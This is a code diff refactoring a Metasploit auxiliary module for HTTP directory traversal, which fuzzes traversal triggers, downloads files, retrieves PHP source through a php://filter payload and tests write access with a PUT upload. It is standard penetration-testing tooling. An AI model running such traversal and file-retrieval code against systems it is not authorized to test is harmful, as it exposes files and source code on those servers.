@@ -42,10 +42,10 @@ class MetasploitModule < Msf::Auxiliary
       'License'        => MSF_LICENSE,
       'Actions'        =>
         [
-          ['CHECK',    {'Description' => 'Check for basic directory traversal'}],
-          ['WRITABLE', {'Description' => 'Check if a traversal bug allows us to write anywhere'}],
-          ['DOWNLOAD', {'Description' => 'Attempt to download files after brute forcing a trigger'}],
-          ['PHPSOURCE', {'Description' => 'Attempt to retrieve php source code files'}]
+          ['CHECK',    'Description' => 'Check for basic directory traversal'],
+          ['WRITABLE', 'Description' => 'Check if a traversal bug allows us to write anywhere'],
+          ['DOWNLOAD', 'Description' => 'Attempt to download files after brute forcing a trigger'],
+          ['PHPSOURCE', 'Description' => 'Attempt to retrieve php source code files']
         ],
       'DefaultAction'  => 'CHECK'
     ))
@@ -73,8 +73,6 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('FILE',      [false, 'Default file to read for the fuzzing stage', '']),
         OptString.new('COOKIE',    [false, 'Cookie value to use when sending the requests', ''])
       ])
-
-    deregister_options('RHOST')
   end
 
 
@@ -88,6 +86,12 @@ class MetasploitModule < Msf::Auxiliary
     @data || datastore['DATA']
   end
 
+  #
+  # Constructs an URL from the current context and a provided URI
+  #
+  def build_url(uri)
+    "http#{datastore['SSL'] ? 's' : ''}://#{rhost}:#{rport}#{uri}"
+  end
 
   #
   # The fuzz() function serves as the engine for the module.  It can intelligently mutate
@@ -117,7 +121,7 @@ class MetasploitModule < Msf::Auxiliary
           trigger = base * d
           p = normalize_uri(datastore['PATH']) + trigger + f
           req = ini_request(p)
-          vprint_status("Trying: http://#{rhost}:#{rport}#{p}")
+          vprint_status("Trying: #{build_url(p)}")
           res = send_request_cgi(req, 25)
           return trigger if res and res.to_s =~ datastore['PATTERN']
         end
@@ -202,7 +206,7 @@ class MetasploitModule < Msf::Auxiliary
 
       uri = normalize_uri(datastore['PATH']) + trigger + datastore['FILE']
       req = ini_request(uri)
-      vprint_status("Trying: http://#{rhost}:#{rport}#{uri}")
+      vprint_status("Trying: #{build_url(uri)}")
       res = send_request_cgi(req, 25)
       found = true if res and res.to_s =~ datastore['PATTERN']
     end
@@ -242,10 +246,12 @@ class MetasploitModule < Msf::Auxiliary
       req = ini_request(uri = (normalize_uri(datastore['PATH']) + trigger + f).chop)
       res = send_request_cgi(req, 25)
 
-      vprint_status("#{res.code.to_s} for http://#{rhost}:#{rport}#{uri}") if res
+      next if not res or res.body.empty?
+
+      vprint_status("#{res.code.to_s} for #{build_url(uri)}")
 
       # Only download files that are within our interest
-      if res and res.to_s =~ datastore['PATTERN']
+      if res.to_s =~ datastore['PATTERN']
         # We assume the string followed by the last '/' is our file name
         fname = f.split("/")[-1].chop
         loot = store_loot("lfi.data","text/plain",rhost, res.body,fname)
@@ -269,7 +275,9 @@ class MetasploitModule < Msf::Auxiliary
       req = ini_request(uri = (normalize_uri(datastore['PATH']) + "php://filter/read=convert.base64-encode/resource=" + f).chop)
       res = send_request_cgi(req, 25)
 
-      vprint_status("#{res.code.to_s} for http://#{rhost}:#{rport}#{uri}") if res
+      next if not res or res.body.empty?
+
+      vprint_status("#{res.code.to_s} for #{build_url(uri)}")
 
       # We assume the string followed by the last '/' is our file name
       fname = f.split("/")[-1].chop
@@ -300,7 +308,7 @@ class MetasploitModule < Msf::Auxiliary
     # Form the PUT request
     fname = Rex::Text.rand_text_alpha(rand(5) + 5) + '.txt'
     uri = normalize_uri(datastore['PATH']) + trigger + fname
-    vprint_status("Attempt to upload to: http://#{rhost}:#{rport}#{uri}")
+    vprint_status("Attempt to upload to: #{build_url(uri)}")
     req = ini_request(uri)
 
     # Upload our unique string, don't care much about the response
